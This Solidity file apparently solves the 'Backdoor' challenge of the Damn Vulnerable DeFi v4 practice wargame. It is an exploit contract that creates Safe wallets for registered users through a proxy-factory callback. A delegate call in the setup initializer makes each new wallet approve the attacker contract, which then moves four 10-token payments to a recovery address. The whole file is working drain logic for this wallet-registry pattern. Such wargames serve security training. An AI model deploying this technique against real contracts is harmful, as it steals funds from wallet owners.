// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";  
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract BackdoorExploiter {
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    Safe private immutable singletonCopy;
    SafeProxyFactory private immutable walletFactory;
    WalletRegistry private immutable walletRegistry;
    DamnValuableToken private immutable token;

    address recovery;
    address[] users;

    constructor(
        address payable _singletonCopy,
        address _walletFactory,
        address _walletRegistry,
        address _recovery,
        address _token,
        address[] memory _users
    ) {
        singletonCopy = Safe(_singletonCopy);
        walletFactory = SafeProxyFactory(_walletFactory);
        walletRegistry = WalletRegistry(_walletRegistry);
        token = DamnValuableToken(_token);
        recovery = _recovery;
        users = _users;
    }

    function delegateApprove(address spender) external {
        token.approve(spender, PAYMENT_AMOUNT);
    }

    function exploit() public {

        SafeProxy[] memory proxies = new SafeProxy[](4);

        for (uint256 i = 0; i < 4; i++) {
            // Prepare the initializer for the Safe setup
            bytes memory data = abi.encodeWithSignature(
                "delegateApprove(address)",
                address(this)
            );
            address[] memory owner = new address[](1);
            owner[0] = users[i];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owner, // owner: alice
                1, // Threshold
                address(this), // to: Contract address for optional delegate call
                data, // data: Data payload for optional delegate call
                0, // Fallback handler
                0, // payment token
                0, // payment
                0  // payment receiver
            );

            // Create a proxy for each user
            proxies[i] = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                i, // salt nonce
                IProxyCreationCallback(walletRegistry)
            );
        }

        token.transferFrom(address(proxies[0]), recovery, PAYMENT_AMOUNT);
        token.transferFrom(address(proxies[1]), recovery, PAYMENT_AMOUNT);
        token.transferFrom(address(proxies[2]), recovery, PAYMENT_AMOUNT);
        token.transferFrom(address(proxies[3]), recovery, PAYMENT_AMOUNT);
    }
}